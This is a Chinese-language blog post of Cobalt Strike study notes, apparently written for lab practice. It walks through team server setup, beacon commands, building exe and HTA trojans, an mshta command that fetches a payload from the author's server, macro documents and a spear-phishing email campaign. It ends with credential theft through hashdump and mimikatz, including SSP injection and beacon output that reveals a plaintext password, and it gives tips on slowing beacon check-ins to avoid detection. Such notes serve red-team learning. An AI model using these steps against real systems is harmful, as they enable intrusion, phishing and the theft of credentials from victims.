<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Cobalt Strike学习笔记 | micgo's blog</title><meta name="keywords" content="CS"><meta name="author" content="micgo"><meta name="copyright" content="micgo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Cobalt strike的安装与使用Cobalt Strike 要求 Oracle Java 1.8，Oracle Java 11, 或 OpenJDK 11 安装Windows客户端的安装 安装windows10虚拟机(防止中毒，也可直接安装在本机，方便很多)  ：配java环境 安装cs服务端  管理员身份运行powshell: 123.&#x2F;Keytool.exe -keystore .&#x2F;co">
<meta property="og:type" content="article">
<meta property="og:title" content="Cobalt Strike学习笔记">
<meta property="og:url" content="https://micgo.top/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Cobalt%20Strike%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="micgo&#39;s blog">
<meta property="og:description" content="Cobalt strike的安装与使用Cobalt Strike 要求 Oracle Java 1.8，Oracle Java 11, 或 OpenJDK 11 安装Windows客户端的安装 安装windows10虚拟机(防止中毒，也可直接安装在本机，方便很多)  ：配java环境 安装cs服务端  管理员身份运行powshell: 123.&#x2F;Keytool.exe -keystore .&#x2F;co">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg">
<meta property="article:published_time" content="2023-01-16T16:00:00.000Z">
<meta property="article:modified_time" content="2023-03-29T06:01:55.201Z">
<meta property="article:author" content="micgo">
<meta property="article:tag" content="CS">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg"><link rel="shortcut icon" href="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg"><link rel="canonical" href="https://micgo.top/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/Cobalt%20Strike%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Cobalt Strike学习笔记',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-03-29 14:01:55'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="micgo's blog" type="application/atom+xml">
</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">micgo's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Cobalt Strike学习笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-16T16:00:00.000Z" title="发表于 2023-01-17 00:00:00">2023-01-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-29T06:01:55.201Z" title="更新于 2023-03-29 14:01:55">2023-03-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Cobalt Strike学习笔记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h5 id="Cobalt-strike的安装与使用"><a href="#Cobalt-strike的安装与使用" class="headerlink" title="Cobalt strike的安装与使用"></a><strong>Cobalt strike的安装与使用</strong></h5><p>Cobalt Strike 要求 Oracle Java 1.8，Oracle Java 11, 或 OpenJDK 11</p>
<h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p>Windows客户端的安装</p>
<p>安装windows10虚拟机(防止中毒，也可直接安装在本机，方便很多)  ：配java环境 安装cs服务端 </p>
<p>管理员身份运行powshell:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./Keytool.exe -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname &quot;CN=Major Cobalt Strike,OU=AdvancedPenTesting,O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth&quot;</span><br><span class="line"></span><br><span class="line">.\teamserver.bat 192.168.245.2  123456   //先ipconfig看一下本机ip</span><br></pre></td></tr></table></figure>

<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/b4f9206c0bc610193f31cf091c8f5eb82c5616ac.png" alt="image-20230104160436912" style="zoom: 67%;" />



<p>linux服务端</p>
<p>Cobalt Strike 团队服务器必须在受支持的 Linux 系统上运行，以root身份运行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 755 teamserver    //给服务器端运行权限</span><br><span class="line">./teamserver 45.77.20.229 12345678  //192.168.245.132是服务器的内网地址(linux地址)，123456是设置的密码</span><br></pre></td></tr></table></figure>

<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/954e0ff4b530bbb1268535f352168030a45a840f.png" alt="image-20230104161324649"></p>
<p>都配置完成后就可以回到windows客户端，点击运行bat文件（这里踩了个坑，服务端客户端版本不一致连不上）</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/16f10d110a008d658a019bcbf2cba7ed8a0ce2fb.png" alt="image-20230104162009604"></p>
<p>换成一致的4.0版本后成功连接</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/f7da27243126dc12c1b0301041659bd814fcca33.png" alt="image-20230104162535570"></p>
<p><strong>创建监听器</strong><br>Listner(监听器):专门用于对其他对象身上发生的事件或状态改变进行监听和相应处理的对象,当被监视的对象发生情况时,立即采取相应的行动。</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20200921124724312.png" alt="在这里插入图片描述" style="zoom:67%;" />

<p>点击Cobalt Strike -&gt; Listeners-&gt;Add，其中内置了八个Listener</p>
<p>其中beacon为内置监听器，包括dns、http、https、smb四种方式的监听器； foreign为外部监听器，配合Metasploit或者Armitage的监听器;“External C2”,创造隐蔽的C2通道。即支持：HTTP&#x2F;HTTPS以及DNS协议。</p>
<p>示例</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20200921124743671.png" alt="在这里插入图片描述" style="zoom:67%;" />

<p>点击save即创建成功</p>
<h5 id="beacon命令"><a href="#beacon命令" class="headerlink" title="beacon命令"></a><strong>beacon命令</strong></h5><p>help 查看beacon shell所有内置命令帮助,如果想查看指定命令的用法,可以这样help upload</p>
<p>note 给当前目录机器起个名字, note beacon-shell</p>
<p>cd在目标系统中切换目录,注意在win系统中切换目录要用双反斜杠,或者直接用’&#x2F;’ cd c:</p>
<p>mkdir 新建目录, mkdir d:beacon</p>
<p>rm 删除文件或目录, rm d:beacon</p>
<p>upload 上传文件到目标系统中</p>
<p>download从目标系统下载指定文件, download C:Userswin7cnDesktopputty.exe</p>
<p>cancel取消下载任务,比如,一个文件如果特别大,下载可能会非常耗时,假如中途你不想继续下了,就可以用这个取消一下</p>
<p>shell在目标系统中执行指定的cmd命令, shell whoami</p>
<p>getuid 查看当前beacon 会话在目标系统中的用户权限,可能需要bypassuac或者提权</p>
<p>pwd查看当前在目录系统中的路径</p>
<p>ls列出当前目录下的所有文件和目录</p>
<p>drives列表出目标系统的所有分区[win中叫盘符]</p>
<p>ps查看目标系统当前的所有的进程列表</p>
<p>kill杀掉指定进程, kill 4653</p>
<p><strong>sleep 10指定被控端休眠时间, 默认60秒一次回传, 让被控端每10秒来下载一次任务, 实际中频率不宜过快, 容易被发现, 80左右一次即可</strong></p>
<p>jobs列出所有的任务列表,有些任务执行时间可能稍微较长,此时就可以从任务列表中看到其所对应的具体任务id,针对性的清除</p>
<p>jobkill如果发现任务不知是何原因长时间没有执行或者异常,可尝试用此命令直接结束该任务, jobkill 1345</p>
<p>clear清除beacon内部的任务队列</p>
<p>checkin强制让被控端回连一次</p>
<p>exit 终止当前beacon 会话</p>
<p>ctrl + k 清屏</p>
<h5 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a><strong>攻击手段</strong></h5><h6 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a><strong>生成木马</strong></h6><p>以生成的exe远控木马为例：</p>
<p>点击Attacks-&gt;Packages-&gt;Windows Executable（s），选择对应的监听器</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20200921124843316.png" alt="在这里插入图片描述" style="zoom:50%;" />

<p>点击生成的木马文件即上线</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/a1ed72532b6addefe64765c69a2d2f9b15c98721.png" alt="image-20230104210808106"></p>
<p>cobalt strike为了维持连接，会每60秒发送一次连接，但是如果使用的话60秒会造成卡顿, 上线后将默认心跳包改成0s，</p>
<p>修改方法：右键弹出的内容下拉菜单中选择session-&gt;sleep，弹出的对话框中输入0，单击确定</p>
<p>或直接在beacon命令行里输入sleep 0</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20200921125019892.png" alt="在这里插入图片描述" style="zoom:50%;" />

<p>获取自己需要的信息</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/6a09d212341cbf4a7dfbf5c7c395eddbe1de5156.png" alt="image-20230104211146525"></p>
<h6 id="HTML-Application"><a href="#HTML-Application" class="headerlink" title="HTML Application"></a><strong>HTML Application</strong></h6><p>点击Attacks-&gt;Packages-&gt;HTML Application，选择对应的监听器，方法这里有三种(executable&#x2F;VBA&#x2F;powershell)，选择powershell，点击Generate生成，选择生成的路径及文件名保存即可。</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/06c0ab9a3c7e2811baa12e28df1952d1d7fa184a.png" alt="image-20230105103304653" style="zoom: 50%;" />

<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/95dfef4d0f6c4021bc0d97cf9c3bbd250ad8a7e1.png" alt="image-20230105103343948"></p>
<p>开启web服务</p>
<p>点击Attacks-&gt;Web Drive-by-&gt;Host File，选择刚刚生成的木马evil.hta，点击Launch生成下载链接</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/3e5e3700f14cbcda0ad1735cb6f219bf1c9d0118.png" alt="image-20230105103430533" style="zoom: 50%;" />

<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/36e3a4bed52b03bf14a4cadf1436a07fb904b650.png" alt="image-20230105101708192" style="zoom:40%;" />

<p>访问下载木马文件</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/62bb970158c7afbeb154215fd610a8b5d25d15b4.png" alt="image-20230105103536068" style="zoom: 40%;" />

<p>运行木马</p>
<p>打开受害机cmd，运行mshta命令。mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://45.77.20.229/download/file.ext</span><br></pre></td></tr></table></figure>

<p>上线</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/e76b4821300e7aaf16c0c3ae0be523066dd78b03.png" alt="image-20230105102738447" style="zoom: 50%;" />





<h6 id="克隆网站"><a href="#克隆网站" class="headerlink" title="克隆网站"></a><strong>克隆网站</strong></h6><p>我的java环境有问题，烦死了,换了个java版本也不行</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20669b81cb0512606c6a59b3567a06d4b1d93501.png" alt="image-20230106214548145" style="zoom:50%;" />



<p>用户键盘输入的信息都可以在web日志中看到</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1638617920_61ab53406f76617d9f34b.png!small" alt="image-20211201163859793"></p>
<h6 id="microsoft-宏"><a href="#microsoft-宏" class="headerlink" title="microsoft 宏"></a><strong>microsoft 宏</strong></h6><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/t01cdc8b3f9eb1ed0a7.png" alt="img"></p>
<p>不关防火墙保存不了，但可以直接执行，虽然也会检测到，但还是可以上线</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/4123d4671c3865af2a40c927cebc710360040550.png" alt="image-20230106224059530" style="zoom: 33%;" />

<p>将此文档保存为可以执行宏的格式，这里保存的为Doc1.docm</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230109110458850.png" alt="image-20230109110458850"></p>
<p>在自己电脑上打开此文件，即可在cs中看到自己上线的主机</p>
<h6 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h6><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/54f99583be0ce4fd1b50728708d8912a40fa26ac.png" alt="image-20230108202436425"></p>
<p>建立一个钓鱼页面去收集用户信息，其中主机地址和端口就是TeamServerIP和端口，RedirectUrl就是点击后跳转的URL，可以填一个大型网站，底下的使用JavaApplet复选框也已经过时对于受害者系统版本较低的情况下可以使用，点击开始后会生成URL，只要诱导用户访问即上线</p>
<p>用户访问后跳转到百度，在 视图-&gt;应用信息 可以看到收集的信息</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/a2810945d3fa95fa19c30beccb16728c71e10545.png" alt="image-20230108202227397" style="zoom:33%;" />

<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/50327de6b6b413f4b808196ded7701531da24655.png" alt="image-20230108202330601" style="zoom:33%;" />

<p>能够看到目标使用的浏览器版本、系统版本等信息了，知道了版本信息，就能够进一步知道目标上可能存在什么漏洞。</p>
<h6 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a><strong>钓鱼邮件</strong></h6><p>鱼叉式网络钓鱼攻击针对特定组织内的特定目标个体，相对于普通钓鱼攻击来说针对的目标更加精准，所以形象的成为鱼叉钓鱼攻击</p>
<p>当进行攻击的骇客锁定目标后，会以电子邮件的方式，假冒该公司或组织的名义寄发难以辨真伪之档案，诱使员工进一步登录其账号密码，使攻击者可以以此借机安装特洛伊木马或其他间谍软件，窃取机密；或于员工时常浏览之网页中置入病毒自动下载器，并持续更新受感染系统内之变种病毒，使使用者穷于应付。由于鱼叉式网络钓鱼锁定之对象并非一般个人，而是特定公司、组织之成员，故受窃之资讯已非一般网络钓鱼所窃取之个人资料，而是其他高度敏感性资料，如知识产权及商业机密</p>
<p>比较常见的鱼叉攻击就是发钓鱼邮件攻击，接下来使用CS来进行演示</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/7991b5b1a8525572be53e7648988d156.png" alt="image-20211202174355081"></p>
<p>基本步骤</p>
<ol>
<li><p>创建一个目标清单</p>
</li>
<li><p>制作一个邮件模板或者使用之前制作好的模板，制作克隆网站</p>
</li>
<li><p>选择一个用来发送邮件的邮件服务器</p>
</li>
<li><p>发送邮件</p>
</li>
</ol>
<p><strong>1.创建目标清单</strong><br>目标清单就是一个包含多个邮箱地址的txt文本文件，每行包含一个目标</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test@163.com	Victim</span><br><span class="line">test2@163.com	Victim2</span><br></pre></td></tr></table></figure>

<p>前面的部分为后面的部分为对于受害者的备注信息，中间用tab键分隔<br>这样一个目标清单制作好了</p>
<p>2.制作邮件模板</p>
<p>在邮箱中找到合适的邮件，选择显示邮件原文，复制另存为txt文件就行</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230109132944986.png" alt="image-20230109132944986" style="zoom: 50%;" />

<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230109132843786.png" alt="image-20230109132843786" style="zoom: 33%;" />



<p><strong>3.选择邮件服务器</strong></p>
<p>我这里直接使用的163的邮箱(手动开启SMTP POP3服务全开)</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/1f4233df0f635ba7c9ef759a3fc84b5d.png" alt="image-20211202195115072" style="zoom: 67%;" />



<p><strong>4.发送邮件</strong></p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/0830e6116824d1c69f38cc1126d101f5.png" alt="image-20211202181501438"></p>
<p>EmbedURL 选择生成的克隆网站链接</p>
<p>BounceTo，Bounce To为退回邮件接收地址，注意要和配置邮件服务器时填的邮箱一致</p>
<p>Preview按钮可以查看邮件模块效果</p>
<p>设置邮箱信息</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230109132051940.png" alt="image-20230109132051940" style="zoom:50%;" />

<p>注意：该密码非邮箱密码，而是开启stmp服务时授权码，使用SSL，163邮箱的25端口可能会连不通，用465端口</p>
<p>send</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230109133241835.png" alt="image-20230109133241835" style="zoom: 43%;" />

<p>收到钓鱼邮件</p>
<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230109131658056.png" alt="image-20230109131658056" style="zoom: 33%;" />

<p>点击链接跳转到设置的url</p>
<p>可以拓展很多其他用法，比如带上木马附件，跳转链接为恶意链接等……</p>
<p><strong>凭证和哈希获取</strong></p>
<p>想要获取凭证信息，可以在管理员权限的会话处右击选择<code>Access --&gt; Dump Hashes</code>，或者在控制台中使用<code>hashdump</code>命令。</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20220214112236.png" alt="image-20220214112235725"></p>
<p>想获取当前用户的密码，可以运行<code>mimikatz</code>，右击管理员权限会话选择<code>Access --&gt; Run Mimikatz</code>，或在控制台运行<code>logonpasswords</code>命令。</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20220214112330.png" alt="image-20220214112328803"></p>
<p>在<code>View --&gt; Credentials</code>下可以查看到<code>hashdump</code>与<code>mimikatz</code>获取的数据。</p>
<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20220214112356.png" alt="image-20220214112354732"></p>
<p> </p>
<h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h5><p>在 Beacon 中集成了 mimikatz ，mimikatz 执行命令有三种形式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz [module::command] &lt;args&gt; 运行 mimikatz 命令</span><br><span class="line">mimikatz [!module::command] &lt;args&gt;强制提升到 SYSTEM 权限再运行命令，因为一些命令只有在 SYSTEM 身份下才能被运行</span><br><span class="line">mimikatz [@module::command] &lt;args&gt;使用当前 Beacon 的访问令牌运行 mimikatz 命令</span><br></pre></td></tr></table></figure>

<p>下面是一些<code>mimikatz</code>命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">!lsadump::cache 获取缓存凭证，默认情况下 Windows 会缓存最近10个密码哈希</span><br><span class="line">!lsadump::sam   获取本地账户密码哈希，该命令与 hashdump 比较类似</span><br><span class="line">misc::cmd       如果注册表中禁用了 CMD ，就重新启用它</span><br><span class="line">!misc::memssp 注入恶意的 Windows SSP 来记录本地身份验证凭据，这个凭证存储在“C:\windows\system32\mimilsa.log”中</span><br><span class="line">misc::skeleton   该命令仅限域内使用。该命令会给所有域内用户添加一个相同的密码，域内所有的用户都可以使用这个密码进行认证，同时原始密码也可以使用,其原理是对 lsass.exe 进行注入，重启后会失效。</span><br><span class="line">process::suspend [pid] 挂起某个进程，但是不结束它</span><br><span class="line">process::resume [pid] 恢复挂起的进程</span><br></pre></td></tr></table></figure>

<p>以上的这些只是<code>mimikatz</code>能做事情的一小部分，下面看看<code>!misc::memssp</code>的使用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz !misc::memssp</span><br><span class="line">cd C:\Windows\system32</span><br><span class="line">shell dir mimilsa.log</span><br><span class="line">shell type mimilsa.log</span><br></pre></td></tr></table></figure>

<p>详细运行过程：</p>
<p>首先运行<code>mimikatz !misc::memssp</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; mimikatz !misc::memssp</span><br><span class="line">[*] Tasked beacon to run mimikatz&#x27;s !misc::memssp command</span><br><span class="line">[+] host called home, sent: 1006151 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">Injected =)</span><br></pre></td></tr></table></figure>

<p>接下来来到<code>C:\Windows\system32</code>目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; cd C:\Windows\system32</span><br><span class="line">[*] cd C:\Windows\system32</span><br><span class="line">[+] host called home, sent: 27 bytes</span><br><span class="line"> </span><br><span class="line">beacon&gt; shell dir mimilsa.log</span><br><span class="line">[*] Tasked beacon to run: dir mimilsa.log</span><br><span class="line">[+] host called home, sent: 46 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 BE29-9C84</span><br><span class="line"> </span><br><span class="line"> C:\Windows\system32 的目录</span><br><span class="line"> </span><br><span class="line">2020/07/23  21:47                24 mimilsa.log</span><br><span class="line">               1 个文件             24 字节</span><br><span class="line">               0 个目录 17,394,728,960 可用字节</span><br></pre></td></tr></table></figure>

<p>可以看到是存在<code>mimilsa.log</code>文件的，此时待目标主机重新登录，比如电脑锁屏后用户进行登录。</p>
<p>查看<code>mimilsa.log</code>文件内容。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell type mimilsa.log</span><br><span class="line">[*] Tasked beacon to run: type mimilsa.log</span><br><span class="line">[+] host called home, sent: 47 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">[00000000:000003e5] \    </span><br><span class="line">[00000000:002b99a7] WIN-75F8PRJM4TP\Administrator    Password123!</span><br></pre></td></tr></table></figure>

<p>成功获取到当前登录用户的明文密码。</p>
